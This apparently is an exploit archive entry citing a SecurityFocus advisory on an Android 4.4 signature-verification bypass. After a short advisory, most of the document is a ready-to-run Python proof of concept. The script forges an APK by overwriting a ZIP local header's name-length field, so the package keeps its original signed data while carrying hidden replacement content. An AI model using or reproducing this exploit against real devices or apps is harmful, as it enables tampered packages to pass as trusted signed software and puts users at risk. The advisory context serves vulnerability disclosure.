source: https://www.securityfocus.com/bid/63547/info

Google Android is prone to a security-bypass vulnerability.

Attackers can exploit this issue to bypass certain security restrictions to perform unauthorized actions. This may aid in further attacks.

Android 4.4 is vulnerable; other versions may also be affected.

#!/usr/bin/python

import zipfile
import struct
import sys

# usage: ./pocB.py new.apk old.apk file data
zout = zipfile.ZipFile(sys.argv[1], "w")
zin = zipfile.ZipFile(sys.argv[2], "r")
replace = sys.argv[3]
new = open(sys.argv[4], 'r').read()

fp = zout.fp

for name in zin.namelist():
    old = zin.read(name)
    if name != replace:
        zout.writestr(name, old, zipfile.ZIP_DEFLATED)
    else:
        assert len(new) <= len(old)

        # write header, old data, and record offset
        zout.writestr(name, old, zipfile.ZIP_STORED)
        offset = fp.tell()

        # return to name length, set to skip old data
        fp.seek(-len(old) -len(name) -4, 1)
        fp.write(struct.pack('<h', len(name) + len(old)))

        # after old data, write new data \0 padded
        fp.seek(offset)
        fp.write(new)
        fp.write('\0' * (len(old) - len(new)))

zout.close()
zin.close()